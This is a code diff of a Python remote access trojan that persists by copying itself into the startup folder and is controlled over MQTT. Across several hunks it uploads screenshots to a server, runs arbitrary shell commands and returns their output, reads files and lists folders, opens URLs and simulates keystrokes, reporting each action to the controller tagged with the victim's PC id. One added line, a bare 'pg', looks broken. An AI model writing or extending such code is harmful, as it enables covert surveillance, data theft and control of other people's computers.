@@ -34,6 +34,7 @@ def add_to_startup():
         destination = startup_dir / exe_path.name
         if not destination.exists():
             shutil.copy(exe_path, destination)
+            pg
     except Exception as e:
         print(f"Failed to add to startup: {e}")
 
@@ -66,9 +67,10 @@ def take_screenshot():
         pg.screenshot(filename)
         with open(filename, "rb") as f:
             requests.post(f"{serverUrl}/upload", files={"screenshot": f}, timeout=5)
+            client.publish(ACK_TOPIC,f"Screenshot Captured Of Pc : {pc_id}")
         os.remove(filename)
     except Exception as e:
-        print(f"[screenshot error] {e}")
+        client.publish(ACK_TOPIC,f"[screenshot error : {pc_id}] {e}")
 
 def safe_thread(target, *args, **kwargs):
     def wrapper():
@@ -76,7 +78,9 @@ def safe_thread(target, *args, **kwargs):
             target(*args, **kwargs)
         except Exception as e:
             print(f"[ERROR] {target.__name__}: {e}")
+            client.publish(ACK_TOPIC,f"[ERROR : {pc_id}] {target.__name__}: {e}")
             traceback.print_exc()
+
     t = threading.Thread(target=wrapper, daemon=True)
     t.start()
 
@@ -137,11 +141,6 @@ def handle_msg(msg):
             client.publish(ACK_TOPIC,f"Logged data of : {pc_id} : {data}")      
         elif msg == "end":
             os._exit(0)
-
-        elif msg.startswith("subprocess"):
-            cmd = msg[len("subprocess "):]
-            safe_thread(subprocess.run, cmd, shell=True)
-
         elif msg.startswith("browser"):
             url = msg[len("browser "):]
             safe_thread(webbrowser.open, url)
@@ -170,7 +169,7 @@ def handle_msg(msg):
             text = msg[len("inputprompt "):]
             def handle_input():
                 value = inputPrompt(text)
-                client.publish(ACK_TOPIC, value)
+                client.publish(ACK_TOPIC,f"{pc_id} : {value}")
             safe_thread(handle_input)
         elif msg.startswith("playtone"):
             parts = msg[len("playtone "):].split()
@@ -178,11 +177,14 @@ def handle_msg(msg):
                 safe_thread(winsound.Beep, int(parts[0]), int(parts[1]))    
         elif msg.startswith("keydown"):
             text = msg[len("keydown "):]
-            safe_thread(pg.keyDown, text, 0.2) 
+            def keydownfunc():
+                pg.keyDown(text)
+            safe_thread(keydownfunc) 
         elif msg.startswith("keyup"):
             text = msg[len("keyup "):]
-            safe_thread(pg.keyUp, text, 0.2) 
-                      
+            def keyupfunc():
+                pg.keyUp(text)
+            safe_thread(keyupfunc) 
         elif msg.startswith("backspace"):
             count = int(msg[len("backspace "):])
             def backspacer():
@@ -221,7 +223,7 @@ def handle_msg(msg):
                 except Exception as e:
                     client.publish(ACK_TOPIC, f"Error listing folder: {e}")
 
-                safe_thread(list_cmd)
+            safe_thread(list_cmd)
 
         elif msg.startswith("readfile"):
             cmd_data = msg[len("readfile "):]
@@ -286,7 +288,7 @@ def handle_msg(msg):
             def cmd_exec():
                 try:
                     result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-                    client.publish(ACK_TOPIC,f"SUBPROCESS_{pc_id} :--Result--> {result.stdout} :--Error-->{result.stderr}")
+                    client.publish(ACK_TOPIC,f"SUBPROCESS_{pc_id} :--Success--> {result.stdout}")
                 except Exception as e:
                     client.publish(ACK_TOPIC, f"Error: {e}")
             safe_thread(cmd_exec)
@@ -318,8 +320,8 @@ def on_connect(client, userdata, flags, rc):
 def on_message(client, userdata, msg):
     message = msg.payload.decode()
     print(f"Received: {message}")
-    handle_msg(message)
     client.publish(ACK_TOPIC, f"ACK:{pc_id} : RECIEVED [ {message} ]")
+    handle_msg(message)
 
 # MQTT client setup
 client = mqtt.Client()
